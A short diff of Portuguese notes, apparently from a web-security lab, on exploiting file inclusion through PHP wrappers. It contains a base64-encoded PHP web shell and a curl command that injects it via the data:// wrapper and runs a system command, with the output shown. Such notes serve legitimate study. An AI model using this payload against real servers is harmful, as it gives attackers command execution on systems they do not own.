@@ -18,7 +18,7 @@ Resultado: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
 ```
 curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
 ```
-Resultado: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<b>Resultado:</b> uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ### Wrapper input
 Envie o web shell como dados POST e passe o comando como parâmetro GET:
